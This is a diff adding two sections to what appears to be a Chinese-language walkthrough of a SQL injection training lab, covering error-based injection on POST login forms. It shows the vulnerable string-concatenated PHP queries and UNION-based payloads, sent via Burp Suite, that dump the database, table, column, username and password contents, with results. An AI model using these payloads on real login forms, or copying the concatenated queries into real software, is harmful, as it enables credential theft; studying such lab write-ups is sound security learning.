@@ -212,3 +212,60 @@ $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
 
 
 
+##### 11. Error Based - Single quotes - String
+
+题目是一个登录页面，因此可能不是简单的get请求，修改url请求地址就能做到注入，尝试先抓包看看登录的时候的请求。
+
+Burp Suite中可以看到，点击登录的时候，发起了一个`Post`请求。
+
+从源码中，可以看到对`Post`表单中数据的拼接使用。
+
+```php
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+```
+
+因此，我只需要在Burp Suite中，截获post请求的表单，对`uname`字段进行注入即可。
+
+```sql
+// 获取库名 
+xx'uname=-qing' union select 1,database()##&passwd=1&submit=Submit 
+// 结果: security
+// 获取表名  
+xx'uname=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&passwd=1&submit=Submit
+// 结果： emails,referers,uagents,users
+// 获取users表列名
+xx'uname=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users')#&passwd=1&submit=Submit
+// 结果:id,username,password
+// 爆破user表内容
+xx'uname=-1' union select 1,(select group_concat(username) from security.users)#&passwd=1&submit=Submit
+xx'uname=-1' union select 1,(select group_concat(password) from security.users)#&passwd=1&submit=Submit
+/* 
+结果： name： 
+Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
+*/
+/*
+结果： password：
+Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+*/
+```
+
+
+
+##### 12. Error Based - Double quotes - String - with twist
+
+又遇上特殊组合
+
+```php
+$uname='"'.$uname.'"'
+$passwd='"'.$passwd.'"'
+@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+```
+
+因此破解需要使用`")`
+
+```sql
+xx("uname=-1") union select 1,2 ##&passwd=admin&submit=Submit
+```
+
+
+
